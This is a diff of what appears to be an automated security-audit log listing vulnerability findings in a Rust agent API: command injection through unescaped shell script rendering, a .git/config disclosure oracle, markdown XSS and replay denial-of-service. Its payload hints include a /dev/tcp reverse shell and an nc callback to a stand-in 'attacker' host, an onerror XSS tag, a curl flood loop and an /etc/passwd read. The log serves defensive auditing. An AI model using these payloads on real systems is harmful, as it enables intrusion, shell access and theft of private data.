@@ -1,6 +1,8 @@
 phase23.exploration.v1 task=expl-demo
 survey-only run (ALLOWED HOSTS empty, TARGETS empty)
-findings emitted via record_exploration_finding payload below
+findings emitted via record_exploration_finding payloads below
+re-validated against current router.rs (HEAD diff: ensure_bundle_path_inside_root,
+verify_bundle_sha256 in replay path, 120s wall-clock deadline) — mitigated rows dropped
 
 ---
 record_exploration_finding
@@ -94,22 +96,22 @@ record_exploration_finding
 record_exploration_finding
 {
   "path": "crates/nyx-agent-api/src/router.rs",
-  "line": 1723,
-  "cap": "OS_COMMAND",
-  "endpoint": "POST /api/v1/findings/:id/replay",
-  "rationale": "replay_repro_bundle extracts the per-finding USTAR bundle into a tempdir and unconditionally runs `bash <id>/repro.sh`. The script body is built by render_repro_script (repro_bundle.rs:229) which interpolates finding.id, finding.rule, payload.cap, payload.lang directly into the shell source with no escaping — the format string places them inside a `# cap={cap} lang={lang} rule={rule}` comment and inside `echo \"[repro] finding={id} cap={cap}\"`. A newline in `rule` or `cap` breaks out of the comment / quoted echo and runs arbitrary shell. Those fields ride in from `CandidateFindingRecord` populated by the AI Exploration / NovelFinding passes (the very surfaces this Phase-23 worker writes to), so an attacker who can land a single quarantined candidate with `cap = \"X\\nbash -i >& /dev/tcp/attacker/4444 0>&1\\n#\"` and convince the operator to click \"Replay\" gets shell on the daemon host. The replay handler runs bash directly, no sandbox lane, so the static escape suite gate does not apply. Static pass missed because the taint path crosses sqlite (candidate row -> finding row -> bundle render -> exec).",
-  "suggested_payload_hint": "candidate_findings row: cap = \"AUTH_BYPASS\\nbash -c 'id|nc attacker 4444'\\n#\"; promote -> POST /findings/<id>/replay; watch attacker tcp:4444 land a callback."
+  "line": 759,
+  "cap": "INFO_DISCLOSURE",
+  "endpoint": "POST /api/v1/repos/test (source_kind=local-path)",
+  "rationale": "The local-path branch (router.rs:759-786) constructs `std::path::Path::new(&req.source_url_or_path)` from the JSON body, then differentiates the response three ways: (a) `path … does not exist` (line 764), (b) `path … is not a directory` (line 771), (c) `path readable; on-disk .git/config remote = <url>` (line 778) — the third branch reads `<path>/.git/config` via read_local_git_remote (router.rs:859) and parses the `[remote \"origin\"]` url= line straight into the response body. There is no allowlist confining the path to the configured repos root, no symlink-follow guard, no rejection of absolute paths outside the daemon's working set. Net effect against an attacker holding the bearer (trivially reachable via the leaked-`?token=` paths above): the endpoint is (i) a full filesystem-existence oracle for any path the daemon's uid can stat, and (ii) a content-exfiltration channel for any `.git/config` the daemon's uid can read — including operator home dirs, neighbouring service workdirs, and CI runner checkouts that frequently carry credential helpers / private-repo URLs in the same file. Distinct sink from the git-ls-remote rows: nothing reaches `git` here. Static pass missed because the disclosure is shaped as a deliberate `ok:true` response field (`on_disk_git_remote`), so taint tracking sees a sanctioned data flow, not a leak.",
+  "suggested_payload_hint": "POST /api/v1/repos/test {\"source_kind\":\"local-path\",\"source_url_or_path\":\"/Users/<op>/work/<private-repo>\"} — non-null on_disk_git_remote in response confirms read; sweep candidate paths to map the operator's checkout tree, then escalate against any path whose .git/config carries a credential-bearing url= line."
 }
 
 ---
 record_exploration_finding
 {
   "path": "crates/nyx-agent-api/src/router.rs",
-  "line": 1639,
-  "cap": "PATH_TRAVERSAL",
-  "endpoint": "GET /api/v1/findings/:id/repro-bundle.tar",
-  "rationale": "download_repro_bundle reads `row.path` from the repro_bundles table and pipes it straight to std::fs::read with no canonicalisation, no prefix check against state_bundles_dir, and no symlink check. The path is treated as trusted because the writer (`build_bundle`) places files inside the configured bundle root, but the schema does not constrain inserts to that root. Any later code path that writes a repro_bundles row — including a future migration, a sqlite import, an operator-run psql session, or any newly-added handler that takes a path from JSON — turns this endpoint into an authenticated arbitrary-file-read: the response sets Content-Disposition: attachment with the finding id as filename, so the operator's browser will happily save /etc/passwd, the daemon's auth_token file (state_dir.load_or_mint_auth_token output), the sqlite DB, or repo workspaces containing private source. Static pass missed because the read sink looks safe in isolation; the bug is the *missing* boundary check on a DB-sourced path, which the taint tracker treats as already-validated.",
-  "suggested_payload_hint": "UPDATE repro_bundles SET path = '/etc/passwd' WHERE finding_id = '<target>'; then GET /api/v1/findings/<target>/repro-bundle.tar — body returns /etc/passwd bytes."
+  "line": 1723,
+  "cap": "OS_COMMAND",
+  "endpoint": "POST /api/v1/findings/:id/replay",
+  "rationale": "replay_repro_bundle extracts the per-finding USTAR bundle into a tempdir and unconditionally runs `bash <id>/repro.sh`. The script body is built by render_repro_script (repro_bundle.rs) which interpolates finding.id, finding.rule, payload.cap, payload.lang directly into the shell source with no escaping — the format string places them inside `# cap={cap} lang={lang} rule={rule}` comments and inside `echo \"[repro] finding={id} cap={cap}\"`. A newline in `rule` or `cap` breaks out of the comment / quoted echo and runs arbitrary shell. Those fields ride in from CandidateFindingRecord populated by the AI Exploration / NovelFinding passes (the very surfaces this Phase-23 worker writes to), so an attacker who can land a single quarantined candidate with `cap = \"X\\nbash -i >& /dev/tcp/attacker/4444 0>&1\\n#\"` and convince the operator to click \"Replay\" gets shell on the daemon host. The replay handler runs bash directly, no sandbox lane, so the static escape suite gate does not apply. The new sha256 verification at line 1739 confirms bytes match the row but does nothing about content that was malicious at write time. Static pass missed because the taint path crosses sqlite (candidate row -> finding row -> bundle render -> exec).",
+  "suggested_payload_hint": "candidate_findings row: cap = \"AUTH_BYPASS\\nbash -c 'id|nc attacker 4444'\\n#\"; promote -> POST /findings/<id>/replay; watch attacker tcp:4444 land a callback."
 }
 
 ---
@@ -126,32 +128,29 @@ record_exploration_finding
 ---
 record_exploration_finding
 {
-  "path": "crates/nyx-agent-api/src/router.rs",
-  "line": 1789,
-  "cap": "INTEGRITY_VIOLATION",
-  "endpoint": "POST /api/v1/findings/:id/replay",
-  "rationale": "replay_repro_bundle reads the bundle bytes from disk (`std::fs::read(&bundle_path)`), pipes them through extract_ustar, and execs `bash <id>/repro.sh`. The repro_bundles row carries an authoritative `sha256` column (build_bundle stamps blake3_hex(&tar_bytes) at write time, repro_bundle.rs:139), but the replay path never recomputes the digest and never compares against the stored value before extraction. The download endpoint exposes the digest as `X-Nyx-Bundle-Sha256` to advertise integrity, yet the replay endpoint — the one that actually executes the bundle — silently trusts on-disk bytes. Anyone who can write the bundle file on the daemon host (state_bundles_dir is configured with the same perms as the rest of state_dir; a co-tenant process, a backup-restore mishap, or an `rsync --delete` followed by a substituted .tar) gets unaudited shell execution under the daemon's identity the next time the operator clicks `Replay`. The stored sha256 becomes false assurance. Static pass missed because the bug is the *absence* of a verification call — no taint flows the wrong way; the right flow simply does not exist.",
-  "suggested_payload_hint": "overwrite <state_bundles_dir>/<finding-id>.tar with a USTAR archive whose <id>/repro.sh body is `#!/bin/sh\\nbash -i >& /dev/tcp/attacker/4444 0>&1`; leave the repro_bundles row + its sha256 untouched; trigger POST /findings/<id>/replay; observe shell — and observe that the digest in the row no longer matches the bytes that ran."
-}
-
----
-record_exploration_finding
-{
-  "path": "crates/nyx-agent-api/src/router.rs",
-  "line": 1786,
-  "cap": "DOS",
-  "endpoint": "POST /api/v1/findings/:id/replay",
-  "rationale": "The replay SSE handler spawns `bash <repro.sh>` with `kill_on_drop(true)` but no wall-clock timeout, no CPU cap, no memory cap, and no per-tenant concurrency limit. The handler holds the SSE stream open until both stdout and stderr drain AND `child.wait().await` returns, so a repro script that never terminates (`while :; do :; done`, `sleep infinity`, `cat /dev/urandom | gzip > /dev/null`) parks one tokio task plus one bash process per request, indefinitely. `kill_on_drop` only fires if the *client* disconnects and the SSE response future is dropped; a client that holds the connection open keeps the child alive forever. Combined with the integrity gap above (or just a legit but pathological repro.sh from any AI-emitted finding), an authenticated caller can pin all available file descriptors / process slots by firing N parallel replays. The handler also has no separate sandbox lane — the child inherits the daemon's full ambient privileges and network reach, so a runaway loop competes directly with scan/AI work on the daemon host. Static pass missed because spawning a child process with piped stdio is the canonical shape — the gap is the missing timeout wrapper around `child.wait().await`, not a tainted sink.",
-  "suggested_payload_hint": "build a bundle whose repro.sh is `#!/bin/sh\\nwhile :; do :; done`; fire `for i in $(seq 1 200); do curl -N -X POST http://127.0.0.1:8088/api/v1/findings/<id>/replay?token=<t> & done`; watch daemon CPU + process table fill up while subsequent legitimate requests stall."
-}
-
----
-record_exploration_finding
-{
   "path": "crates/nyx-agent-core/src/report/run_card.rs",
   "line": 346,
   "cap": "XSS",
   "endpoint": "GET /api/v1/runs/:id/summary.md",
-  "rationale": "render_markdown interpolates `card.run_id`, `card.status`, `card.triggered_by`, every `BySplit.key`, and every `PhaseDuration.phase` directly into the markdown body with no escaping, while the HTML sibling (render_html, line 259) carefully runs the same fields through escape_html. The HTML route is safe; the markdown route is the surface that bites. `by_cap.key` comes from `findings.cap`, `by_origin.key` from `findings.finding_origin`, and `by_lang.key` from `payloads.lang` — every one of those is a string the AI Exploration / NovelFinding writers control (see candidate_findings → findings promotion path). The frontend at frontend/src/pages/Findings/FindingDetail.tsx and the new client.ts (lines 100-120ish) consume the summary endpoints; any code path that pipes the .md body through a markdown-to-HTML renderer with HTML enabled (the default for `marked`, `markdown-it`, `react-markdown` with `rehype-raw`) lands `<img src=x onerror=...>` straight into the operator's DOM. Same payload via the .json endpoint then back through a markdown renderer hits the same sink. Static pass missed because the source field never crosses a `dangerouslySetInnerHTML` call inside the Rust crate — the XSS is a contract violation between the safe HTML renderer and the unsafe MD renderer; both export from the same module so a caller naturally assumes parity.",
+  "rationale": "render_markdown interpolates card.run_id, card.status, card.triggered_by, every BySplit.key (including `by_cap`, `by_origin`, `by_lang`), and every PhaseDuration.phase directly into the markdown body with no escaping (lines 348-406). The HTML sibling render_html (line 259) carefully runs the same fields through escape_html. The HTML route is safe; the markdown route is the surface that bites. by_cap.key comes from findings.cap, by_origin.key from findings.finding_origin, by_lang.key from payloads.lang — every one of those is a string the AI Exploration / NovelFinding writers control (see candidate_findings → findings promotion path). Any consumer that pipes the .md body through a markdown-to-HTML renderer with HTML enabled (the default for marked, markdown-it, react-markdown with rehype-raw) lands `<img src=x onerror=...>` straight into the operator's DOM. Static pass missed because the source field never crosses a `dangerouslySetInnerHTML` call inside the Rust crate — the XSS is a contract violation between the safe HTML renderer and the unsafe MD renderer; both export from the same module so a caller naturally assumes parity.",
   "suggested_payload_hint": "promote a candidate finding with `cap = \"<img src=x onerror=alert(document.domain)>\"`; GET /api/v1/runs/<run>/summary.md; observe the unescaped tag inside the `## Capability` bullet list; any UI that markdown-renders the body executes the payload."
 }
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 1707,
+  "cap": "DOS",
+  "endpoint": "POST /api/v1/findings/:id/replay",
+  "rationale": "Per-request wall-clock cap (REPLAY_WALL_CLOCK_TIMEOUT_SECS=120) exists, but the handler has no concurrency limit, no per-tenant rate limit, and the spawned bash inherits the daemon's full ambient privileges + network reach. An authenticated caller (or anyone holding a leaked ?token=) can fan out N parallel POSTs and pin N tokio tasks plus N bash processes for the full 120s window each, plus 5s reap grace. Fan-out of 200 reqs/sec saturates fd/pid budgets and starves legitimate scan + AI work. Combined with the leaked-token paths above (cross-site WebSocket, CSRF on POST, query-token logging), unauth-equivalent denial-of-service is reachable from a foreign origin. Static pass missed because spawning a child process with a timeout is the canonical shape — the gap is the missing *parallelism* bound, not a tainted sink.",
+  "suggested_payload_hint": "build a bundle whose repro.sh sleeps 119s; fire `for i in $(seq 1 200); do curl -N -X POST http://127.0.0.1:8088/api/v1/findings/<id>/replay?token=<t> & done`; watch daemon process table fill while subsequent legitimate requests stall."
+}
+
+---
+notes:
+- prior sentinel content rewritten this turn
+- PATH_TRAVERSAL on GET /findings/:id/repro-bundle.tar: mitigated by ensure_bundle_path_inside_root (router.rs:1639) — dropped
+- INTEGRITY_VIOLATION on replay path: mitigated by verify_bundle_sha256 against repro_bundles.sha256 (router.rs:1739-1746) — dropped
+- DoS finding kept with revised rationale: per-request 120s cap exists, parallelism unbounded
+- new row this pass: INFO_DISCLOSURE on POST /api/v1/repos/test local-path branch — fs-existence oracle + .git/config exfil; distinct sink from the existing SSRF / git-ext:: rows
